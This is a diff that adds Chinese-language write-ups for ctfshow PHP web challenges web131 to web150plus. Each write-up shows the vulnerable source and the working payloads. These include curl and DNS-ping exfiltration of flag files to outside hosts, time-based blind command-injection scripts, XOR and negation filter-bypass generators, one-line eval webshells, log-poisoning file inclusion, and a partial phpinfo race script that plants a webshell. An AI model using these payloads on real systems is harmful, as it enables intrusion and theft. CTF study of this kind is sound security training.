@@ -5889,6 +5889,1678 @@ POST f=ctfshow
 
 
 
+#### web131
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 05:19:40
+
+*/
+
+
+error_reporting(0);
+highlight_file(__FILE__);
+include("flag.php");
+if(isset($_POST['f'])){
+    $f = (String)$_POST['f'];
+
+    if(preg_match('/.+?ctfshow/is', $f)){
+        die('bye!');
+    }
+    if(stripos($f,'36Dctfshow') === FALSE){
+        die('bye!!');
+    }
+
+    echo $flag;
+
+}
+
+```
+
+正则表达式溢出 https://www.laruence.com/2010/06/08/1579.html 
+
+payload:
+
+```
+#payload:
+<?php
+echo str_repeat('very', '250000').'36Dctfshow';
+```
+
+不宜过多，过多会
+
+![image-20250124131836252](assets/image-20250124131836252.png)
+
+#### web132
+
+![image-20250124132332538](assets/image-20250124132332538.png)
+
+![image-20250124132344174](assets/image-20250124132344174.png)
+
+/admin
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 06:22:13
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 20:05:36
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+#error_reporting(0);
+include("flag.php");
+highlight_file(__FILE__);
+
+
+if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
+    $username = (String)$_GET['username'];
+    $password = (String)$_GET['password'];
+    $code = (String)$_GET['code'];
+
+    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
+        
+        if($code == 'admin'){
+            echo $flag;
+        }
+        
+    }
+}
+```
+
+
+
+第一个判断后面用的是或
+
+也就是说只要使username等于admin即可，前面两个无所谓了
+
+第二个判断让code等于admin即可
+
+payload： 
+
+```
+GET:?code=admin&username=admin&password=
+```
+
+
+
+#### web133
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-13 16:43:44
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+//flag.php
+if($F = @$_GET['F']){
+    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
+        eval(substr($F,0,6));
+    }else{
+        die("6个字母都还不够呀?!");
+    }
+}
+```
+
+[ctfshow web133(变量覆盖+无回显命令执行dns_bp带外) - hithub - 博客园](https://www.cnblogs.com/hithub/p/16809053.html)
+
+这其实是一道关于变量覆盖的题目
+
+```
+get传参   F=`$F `;sleep 3
+经过substr($F,0,6)截取后 得到  `$F `;
+也就是会执行 eval("`$F `;");
+我们把原来的$F带进去
+eval("``$F `;sleep 3`");
+也就是说最终会执行  `   `$F `;sleep 3  ` == shell_exec("`$F `;sleep 3");
+前面的命令我们不需要管，但是后面的命令我们可以自由控制。
+这样就在服务器上成功执行了 sleep 3
+所以 最后就是一道无回显的RCE题目了
+```
+
+payload:
+
+```
+`$F `;cat flag.php | curl -X POST -d @- http://106.55.168.231:7777/
+```
+
+curl外带rce
+
+![image-20250124143152342](assets/image-20250124143152342.png)
+
+
+
+#### web134
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-14 23:01:06
+
+*/
+
+highlight_file(__FILE__);
+$key1 = 0;
+$key2 = 0;
+if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
+    die("nonononono");
+}
+@parse_str($_SERVER['QUERY_STRING']);
+extract($_POST);
+if($key1 == '36d' && $key2 == '36d') {
+    die(file_get_contents('flag.php'));
+}
+```
+
+![image-20250124144438661](assets/image-20250124144438661.png)
+
+看到extract想起变量覆盖
+
+```
+extract($_POST);
+//提取$_POST数组
+```
+
+payload:
+
+```
+?_POST[key1]=36d&_POST[key2]=36d
+```
+
+
+
+#### web135
+
+```
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-16 18:48:03
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+//flag.php
+if($F = @$_GET['F']){
+    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
+        eval(substr($F,0,6));
+    }else{
+        die("师傅们居然破解了前面的，那就来一个加强版吧");
+    }
+}
+```
+
+133plus
+
+这题ban了很多命令
+
+但是没ban nl,mv，可以用nl和cp把flag写到其他文件中
+
+payload:
+
+```
+`$F `;nl f*>1.txt
+`$F `;mv f*>1.txt
+```
+
+![image-20250124150917001](assets/image-20250124150917001.png)
+
+这题也可以用ping进行外带
+
+```
+`$F`;+ping `cat flag.php|awk 'NR==2'`.6x1sys.dnslog.cn
+#通过ping命令去带出数据，然后awk NR一排一排的获得数据
+```
+
+
+
+#### web136
+
+```php
+<?php
+error_reporting(0);
+function check($x){
+    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
+        die('too young too simple sometimes naive!');
+    }
+}
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    check($c);
+    exec($c);
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+这题要用到一个linux的命令tee
+
+> ### Linux [tee](https://so.csdn.net/so/search?q=tee&spm=1001.2101.3001.7020)命令介绍
+>
+> `tee`命令在Linux中用于从标准输入读取数据，并将其写入到标准输出和一个或多个文件中。`tee`命令通常与其他命令一起通过管道使用。
+>
+> 如
+>
+> ```shell
+> ls /|tee 1.txt
+> ```
+>
+> 就可以将ls /的结果写入到1.txt文件中
+
+```
+ls /|tee 1
+```
+
+这题ban掉了.
+
+访问url/1，下载文件1
+
+![image-20250124152140227](assets/image-20250124152140227.png)
+
+看到flag的位置
+
+```
+?c=cat /f149_15_h3r3|tee 2
+```
+
+![image-20250124152240505](assets/image-20250124152240505.png)
+
+#### web137
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-16 22:27:49
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+class ctfshow
+{
+    function __wakeup(){
+        die("private class");
+    }
+    static function getFlag(){
+        echo file_get_contents("flag.php");
+    }
+}
+
+
+
+call_user_func($_POST['ctfshow']);
+```
+
+![image-20250124162118373](assets/image-20250124162118373.png)
+
+我们需要通过post传入一个数组，数组中包含类名和方法名
+
+payload
+
+```
+ctfshow[]=ctfshow&ctfshow[]=getFlag
+```
+
+又或者
+
+```
+ctfshow=ctfshow::getFlag
+```
+
+
+
+#### web138
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-16 22:52:13
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+class ctfshow
+{
+    function __wakeup(){
+        die("private class");
+    }
+    static function getFlag(){
+        echo file_get_contents("flag.php");
+    }
+}
+
+if(strripos($_POST['ctfshow'], ":")>-1){
+    die("private function");
+}
+
+call_user_func($_POST['ctfshow']);
+
+```
+
+这道题限制了上一题的第二种解法
+
+第一种还能继续使用
+
+payload:
+
+```
+ctfshow[]=ctfshow&ctfshow[]=getFlag
+ctfshow[0]=ctfshow&ctfshow[1]=getFlag
+```
+
+
+
+#### web139
+
+```
+<?php
+error_reporting(0);
+function check($x){
+    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
+        die('too young too simple sometimes naive!');
+    }
+}
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    check($c);
+    exec($c);
+}
+else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+这题看着和前面那题是一样的
+
+但实际上没有写文件的权限
+
+这题可以通过时间盲注攻击获取文件名已经文件中的字符等
+
+时间盲注脚本：
+
+```python
+import requests
+import time
+import string
+
+str = string.ascii_letters + string.digits + "-" + "{" + "}" + "_" + "~"    # 构建一个包含所有字母和数字以及部分符号的字符串，符号可以自己加
+result = ""          # 初始化一个空字符串，用于保存结果
+
+#获取多少行
+for i in range(1, 99):
+    key = 0   #用于控制内层循环(j)的结束
+
+    #不break的情况下，一行最多几个字符
+    for j in range(1, 99):
+        if key == 1:
+            break
+        for n in str:       #n就是一个一个的返回值
+            payload = "if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i, j, n)   #{n}是占位符
+            #print(payload)
+            url = "http://89e3e82d-d133-4a9e-a883-790d41e8a3b8.challenge.ctf.show?c=" + payload
+            try:
+                requests.get(url, timeout=(2.5, 2.5))   #设置超时时间为 2.5 秒,包括连接超时和读取超时，超时就是之前sleep 3了。
+
+            # 如果请求发生异常，表示条件满足，将当前字符 n 添加到结果字符串中，并结束当前内层循环
+            except:
+                result = result + n
+                print(result)
+                break
+            if n == '~':    #str的最后一位，“~”不常出现，用作结尾
+                key = 1
+                
+    # 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置
+    result += " "
+
+```
+
+这个脚本的原理其实就是，通过shell编程中的if语句判断
+
+```
+ls /|awk 'NR=={0}'|cut -c {1}
+```
+
+中截取到的字符串是否与我们遍历的任一个字符匹配，若匹配成功则使用sleep命令使响应时间变为3s
+
+而脚本通过判断响应时间即可知道截取到的字符是否匹配，从而一个一个字符的获取
+
+![image-20250124171223602](assets/image-20250124171223602.png)
+
+读到flag的位置，接下来就是读文件了，原理一样
+
+```python
+import requests
+import time
+import string
+
+str = string.digits+string.ascii_lowercase+"-"+"{"+"}"    
+result = ""          
+
+for i in range(1, 99):
+    key = 0   
+    for j in range(1, 99):
+        if key == 1:
+            break
+        for n in str:      
+            payload = "if [ `cat /f149_15_h3r3|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i, j, n)   
+            #print(payload)
+            url = "http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=" + payload
+            try:
+                requests.get(url, timeout=(2.5, 2.5))   
+
+			except:
+                result = result + n
+                print(result)
+                break
+                
+    result += " "
+```
+
+
+
+![image-20250124180128116](assets/image-20250124180128116.png)
+
+#### web140
+
+函数的利用
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-17 12:39:25
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_POST['f1']) && isset($_POST['f2'])){
+    $f1 = (String)$_POST['f1'];
+    $f2 = (String)$_POST['f2'];
+    if(preg_match('/^[a-z0-9]+$/', $f1)){
+        if(preg_match('/^[a-z0-9]+$/', $f2)){
+            $code = eval("return $f1($f2());");
+            if(intval($code) == 'ctfshow'){
+                echo file_get_contents("flag.php");
+            }
+        }
+    }
+}
+
+```
+
+[原文](https://ctf.show/writeups/743106)
+
+需要`$f1($f2());`的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。
+
+**payload1**： system(system())---> `f1=system&f2=system`
+
+`string system( string $command[, int &$return_var] )`：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system('FLASE')，空指令，失败返回FLASE。
+
+**payload2**： usleep(usleep())---> `f1=usleep&f2=usleep` usleep没有返回值。 所以intval参数为空，失败返回0
+
+**payload3**： getdate(getdate())---> `f1=getdate&f2=getdate`
+
+`array getdate([ int $timestamp = time()] )`：返回结果是array，参数必须是int型。所以getdate(getdate())---->getdate(array型)--->失败返回flase，intval为0。
+
+
+
+#### web141
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-17 19:28:09
+
+*/
+
+#error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
+    $v1 = (String)$_GET['v1'];
+    $v2 = (String)$_GET['v2'];
+    $v3 = (String)$_GET['v3'];
+
+    if(is_numeric($v1) && is_numeric($v2)){
+        if(preg_match('/^\W+$/', $v3)){
+            $code =  eval("return $v1$v3$v2;");
+            echo "$v1$v3$v2 = ".$code;
+        }
+    }
+}
+
+```
+
+```
+preg_match('/^\W+$/', $v3)
+```
+
+此正则表达式用于检查字符串 `$v3` **是否完全由非单词字符组成**，且**不能为空**。（单词字符：字母、数字和下划线）
+
+根据题目我们可以联想到取反，或，异或命令执行，这里随便一个都行
+
+> php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1&v2=1&v3=-phpinfo()-
+
+羽师傅有个取反脚本
+
+```php
+<?php
+//在命令行中运行
+
+/*author yu22x*/
+
+fwrite(STDOUT,'[+]your function: ');
+
+$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
+
+fwrite(STDOUT,'[+]your command: ');
+
+$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 
+
+echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
+
+```
+
+直接用就行
+
+![image-20250124220654185](assets/image-20250124220654185.png)
+
+payload:
+
+```
+?v1=1&v2=1&v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-
+```
+
+#### web142
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-17 19:36:02
+
+*/
+
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_GET['v1'])){
+    $v1 = (String)$_GET['v1'];
+    if(is_numeric($v1)){
+        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
+        sleep($d);
+        echo file_get_contents("flag.php");
+    }
+}
+```
+
+这题就是一个$d秒后出flag，直接传入v1=0，直接拿到flag
+
+payload:
+
+```
+?v1=0
+```
+
+
+
+#### web143
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-18 12:48:14
+
+*/
+
+highlight_file(__FILE__);
+if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
+    $v1 = (String)$_GET['v1'];
+    $v2 = (String)$_GET['v2'];
+    $v3 = (String)$_GET['v3'];
+    if(is_numeric($v1) && is_numeric($v2)){
+        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
+                die('get out hacker!');
+        }
+        else{
+            $code =  eval("return $v1$v3$v2;");
+            echo "$v1$v3$v2 = ".$code;
+        }
+    }
+}
+```
+
+这题ban掉了取反，只能用其他位运算符构造payload
+
+羽师傅的异或脚本
+
+```php
+<?php
+
+/*author yu22x*/
+
+$myfile = fopen("xor_rce.txt", "w");
+$contents="";
+for ($i=0; $i < 256; $i++) { 
+	for ($j=0; $j <256 ; $j++) { 
+
+		if($i<16){
+			$hex_i='0'.dechex($i);
+		}
+		else{
+			$hex_i=dechex($i);
+		}
+		if($j<16){
+			$hex_j='0'.dechex($j);
+		}
+		else{
+			$hex_j=dechex($j);
+		}
+		$preg = '/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i'; //根据题目给的正则表达式修改即可
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
+					echo "";
+    }
+  
+		else{
+		$a='%'.$hex_i;
+		$b='%'.$hex_j;
+		$c=(urldecode($a)^urldecode($b));
+		if (ord($c)>=32&ord($c)<=126) {
+			$contents=$contents.$c." ".$a." ".$b."\n";
+		}
+	}
+
+}
+}
+fwrite($myfile,$contents);
+fclose($myfile);
+
+```
+
+```python
+# -*- coding: utf-8 -*-
+
+# author yu22x
+
+import requests
+import urllib
+from sys import *
+import os
+def action(arg):
+   s1=""
+   s2=""
+   for i in arg:
+       f=open("xor_rce.txt","r")
+       while True:
+           t=f.readline()
+           if t=="":
+               break
+           if t[0]==i:
+               #print(i)
+               s1+=t[2:5]
+               s2+=t[6:9]
+               break
+       f.close()
+   output="(\""+s1+"\"^\""+s2+"\")"
+   return(output)
+   
+while True:
+   param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
+   print(param)
+
+```
+
+
+
+#### web144
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-18 16:21:15
+
+*/
+
+highlight_file(__FILE__);
+if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
+    $v1 = (String)$_GET['v1'];
+    $v2 = (String)$_GET['v2'];
+    $v3 = (String)$_GET['v3'];
+
+    if(is_numeric($v1) && check($v3)){
+        if(preg_match('/^\W+$/', $v2)){
+            $code =  eval("return $v1$v3$v2;");
+            echo "$v1$v3$v2 = ".$code;
+        }
+    }
+}
+
+function check($str){
+    return strlen($str)===1?true:false;
+}
+```
+
+这题跟143差不多，只是参数交换了一下位置
+
+直接异或出了
+
+```
+?v1=1&v2=-("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%03%01%0b%00%06%00"^"%60%60%7f%20%60%2a")&v3=1
+```
+
+
+
+#### web145
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-18 17:41:33
+
+*/
+
+
+highlight_file(__FILE__);
+if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
+    $v1 = (String)$_GET['v1'];
+    $v2 = (String)$_GET['v2'];
+    $v3 = (String)$_GET['v3'];
+    if(is_numeric($v1) && is_numeric($v2)){
+        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
+                die('get out hacker!');
+        }
+        else{
+            $code =  eval("return $v1$v3$v2;");
+            echo "$v1$v3$v2 = ".$code;
+        }
+    }
+}
+```
+
+这题ban掉了异或运算符^,同时也ban掉了加减乘除
+
+但是我们还可以考虑构造三目运算符配合取反
+
+payload:
+
+```
+/?v1=1&v2=1&v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):
+```
+
+
+
+#### web146
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-18 17:41:33
+
+*/
+
+
+highlight_file(__FILE__);
+if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
+    $v1 = (String)$_GET['v1'];
+    $v2 = (String)$_GET['v2'];
+    $v3 = (String)$_GET['v3'];
+    if(is_numeric($v1) && is_numeric($v2)){
+        if(preg_match('/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
+                die('get out hacker!');
+        }
+        else{
+            $code =  eval("return $v1$v3$v2;");
+            echo "$v1$v3$v2 = ".$code;
+        }
+    }
+}
+```
+
+这题把三目运算符也ban了
+
+可以考虑使用位运算符|
+
+![image-20250124223416316](assets/image-20250124223416316.png)
+
+payload:
+
+```
+?v1=1&v2=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|
+```
+
+
+
+#### web147
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-19 02:04:38
+
+*/
+
+
+
+highlight_file(__FILE__);
+
+if(isset($_POST['ctf'])){
+    $ctfshow = $_POST['ctf'];
+    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
+        $ctfshow('',$_GET['show']);
+    }
+
+}
+```
+
+create_function()代码注入
+
+如果我们第二个参数传入 echo 1;}phpinfo();//
+就等价于
+
+```
+function f($a) {
+  echo 1;}phpinfo();//
+}
+从而执行phpinfo()命令
+```
+
+那要怎么绕过正则表达式呢
+
+```
+/^[a-z0-9_]*$/isD
+```
+
+这个正则表达式匹配所有的字母数字和下划线
+
+而且由于
+
+> php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法
+
+所以我们可以通过\create_function()来绕过这个正则表达式
+
+payload:
+
+```
+GET show=;};system('cat f*');/*
+POST ctf=\create_function
+```
+
+
+
+#### web148
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-19 03:52:11
+
+*/
+
+
+
+include 'flag.php';
+if(isset($_GET['code'])){
+    $code=$_GET['code'];
+    if(preg_match("/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&\*\+\- ]+/",$code)){
+        die("error");
+    }
+    @eval($code);
+}
+else{
+    highlight_file(__FILE__);
+}
+
+function get_ctfshow_fl0g(){
+    echo file_get_contents("flag.php");
+}
+```
+
+没ban异或运算符
+
+payload:
+
+```
+("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%03%01%09%01%06%02"^"%60%60%7d%21%60%28");
+//system("cat f*");
+```
+
+
+
+#### web149
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-19 04:34:40
+
+*/
+
+
+error_reporting(0);
+highlight_file(__FILE__);
+
+$files = scandir('./'); 
+foreach($files as $file) {
+    if(is_file($file)){
+        if ($file !== "index.php") {
+            unlink($file);
+        }
+    }
+}
+
+file_put_contents($_GET['ctf'], $_POST['show']);
+
+$files = scandir('./'); 
+foreach($files as $file) {
+    if(is_file($file)){
+        if ($file !== "index.php") {
+            unlink($file);
+        }
+    }
+}
+```
+
+直接用一句话木马覆写掉index.php
+
+```
+GET ?ctf=index.php
+POST show=<?php @eval($_POST['1']);?>
+```
+
+写入后
+
+```
+POST 1=system('cat /ctfshow_fl0g_here.txt');
+```
+
+
+
+#### web150
+
+非预期 日志注入
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-19 07:12:57
+
+*/
+include("flag.php");
+error_reporting(0);
+highlight_file(__FILE__);
+
+class CTFSHOW{
+    private $username;
+    private $password;
+    private $vip;
+    private $secret;
+
+    function __construct(){
+        $this->vip = 0;
+        $this->secret = $flag;
+    }
+
+    function __destruct(){
+        echo $this->secret;
+    }
+
+    public function isVIP(){
+        return $this->vip?TRUE:FALSE;
+        }
+    }
+
+    function __autoload($class){
+        if(isset($class)){
+            $class();
+    }
+}
+
+#过滤字符
+$key = $_SERVER['QUERY_STRING'];
+if(preg_match('/\_| |\[|\]|\?/', $key)){
+    die("error");
+}
+$ctf = $_POST['ctf'];
+extract($_GET);
+if(class_exists($__CTFSHOW__)){
+    echo "class is exists!";
+}
+
+if($isVIP && strrpos($ctf, ":")===FALSE){
+    include($ctf);
+}
+```
+
+这题存在非预期，可以通过extract变量覆盖使isVIP=true，接着进行日志注入
+
+![image-20250124231951262](assets/image-20250124231951262.png)
+
+或者
+
+![image-20250126151004338](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126151004338.png)
+
+把马写到日志里
+
+payload:
+
+```
+GET ?isVIP=true&1=system('cat f*');
+POST ctf=/var/log/nginx/access.log
+```
+
+
+
+#### web150plus
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-10-13 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-10-19 07:12:57
+
+*/
+include("flag.php");
+error_reporting(0);
+highlight_file(__FILE__);
+
+class CTFSHOW{
+    private $username;
+    private $password;
+    private $vip;
+    private $secret;
+
+    function __construct(){
+        $this->vip = 0;
+        $this->secret = $flag;
+    }
+
+    function __destruct(){
+        echo $this->secret;
+    }
+
+    public function isVIP(){
+        return $this->vip?TRUE:FALSE;
+        }
+    }
+
+    function __autoload($class){
+        if(isset($class)){
+            $class();
+    }
+}
+
+#过滤字符
+$key = $_SERVER['QUERY_STRING'];
+if(preg_match('/\_| |\[|\]|\?/', $key)){
+    die("error");
+}
+$ctf = $_POST['ctf'];
+extract($_GET);
+if(class_exists($__CTFSHOW__)){
+    echo "class is exists!";
+}
+
+if($isVIP && strrpos($ctf, ":")===FALSE && strrpos($ctf,"log")===FALSE){
+    include($ctf);
+}
+
+```
+
+这题ban掉了非预期解 日志注入的方法
+
+首先我们需要知道__autoload方法的作用
+
+- `__autoload()`：自动加载函数，当使用未定义的类时会自动调用该函数。如果`$class`变量已设置，则将其作为函数调用。
+
+而且这题的__autoload并不在类CTFSHOW中（障眼法）
+
+![image-20250126154119464](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126154119464.png)
+
+这个类在isVIP后面已经结束了
+
+所以我们可以通过
+
+```
+if(class_exists($__CTFSHOW__)){
+    echo "class is exists!";
+}
+```
+
+调用任意的类
+
+我们可以根据php会将.解析成_的特性绕过正则
+
+```
+GET ?..CTFSHOW..=phpinfo
+```
+
+![image-20250126154411534](C:\Users\xrntkk\AppData\Roaming\Typora\typora-user-images\image-20250126154411534.png)
+
+由于原题需要竞争所以后面就直接把flag放环境变量了
+
+这里我们直接在phpinfo里面找就行
+
+
+
+**原题解法**
+拿到phpinfo我们就可以getshell了
+
+> PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。假如在服务器上找不到我们可以包含的文件，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件了。如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。
+> 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902
+
+> 过程
+> 1.发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据
+>
+> 2.phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大
+>
+> 3.php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接
+>
+> 4.操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包
+>
+> 5.此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除
+>
+> 6.利用这个时间差，发第二个数据包，即可成功包含临时文件，最终getshell
+>
+> 处理
+> PHP 对 enctype="multipart/form-data"请求的处理过程如下：
+> 1、请求到达；
+> 2、创建临时文件（通常是/tmp/php[6 个随机字符]），并写入上传文件的内容；
+> 3、调用相应 PHP 脚本进行处理，如校验名称、大小等；
+> 4、删除临时文件。
+> 总结
+> php post 上传文件产生临时文件，phpinfo读临时文件的路径和名字，本地包含后生成后门
+> 原文链接：https://blog.csdn.net/qq_63701832/article/details/129337902
+
+大佬的脚本，但是是python2的
+
+```python
+#!/usr/bin/python 
+import sys
+import threading
+import socket
+ 
+def setup(host, port):
+    TAG="Security Test"
+    PAYLOAD="""%s\r
+<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>\r""" % TAG
+    REQ1_DATA="""-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+%s
+-----------------------------7dbff1ded0714--\r""" % PAYLOAD
+    padding="A" * 5000
+    REQ1="""POST /06/phpinfo.php?a="""+padding+""" HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
+HTTP_ACCEPT: """ + padding + """\r
+HTTP_USER_AGENT: """+padding+"""\r
+HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
+HTTP_PRAGMA: """+padding+"""\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: %s\r
+Host: %s\r
+\r
+%s""" %(len(REQ1_DATA),host,REQ1_DATA)
+    #modify this to suit the LFI script   
+    LFIREQ="""GET /06/lfi.php?file=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+"""
+    return (REQ1, TAG, LFIREQ)
+ 
